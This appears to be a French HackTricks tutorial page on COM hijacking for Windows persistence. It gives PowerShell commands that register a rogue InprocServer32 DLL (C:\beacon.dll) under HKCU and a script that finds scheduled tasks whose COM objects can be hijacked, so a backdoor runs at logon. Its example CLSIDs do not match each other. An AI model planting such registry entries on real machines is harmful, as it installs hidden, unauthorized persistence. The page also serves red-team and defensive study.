# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Recherche de composants COM inexistants

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, **COM Hijacking** pourrait être utilisé comme un **mécanisme persistant**. En utilisant `procmon`, il est facile de trouver des enregistrements COM recherchés qui n'existent pas et qu'un attaquant pourrait créer pour persister. Filtres :

- opérations **RegOpenKey**.
- où le _Résultat_ est **NOM NON TROUVÉ**.
- et le _Chemin_ se termine par **InprocServer32**.

Une fois que vous avez décidé quel COM inexistant imiter, exécutez les commandes suivantes. _Soyez prudent si vous décidez d'imiter un COM qui est chargé toutes les quelques secondes, car cela pourrait être excessif._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Composants COM du Planificateur de tâches détournables

Les tâches Windows utilisent des déclencheurs personnalisés pour appeler des objets COM et, comme elles sont exécutées via le Planificateur de tâches, il est plus facile de prédire quand elles vont être déclenchées.

<pre class="language-powershell"><code class="lang-powershell"># Afficher les CLSIDs COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nom de la tâche : " $Task.TaskName
Write-Host "Chemin de la tâche : " $Task.TaskPath
Write-Host "CLSID : " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sortie d'exemple :
<strong># Nom de la tâche :  Exemple
</strong># Chemin de la tâche :  \Microsoft\Windows\Example\
# CLSID :  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [plus comme le précédent...]</code></pre>

En vérifiant la sortie, vous pouvez en sélectionner une qui va être exécutée **à chaque fois qu'un utilisateur se connecte**, par exemple.

Maintenant, en recherchant le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** et dans HKLM et HKCU, vous constaterez généralement que la valeur n'existe pas dans HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ensuite, vous pouvez simplement créer l'entrée HKCU et chaque fois que l'utilisateur se connecte, votre backdoor sera activée.

{{#include ../../banners/hacktricks-training.md}}
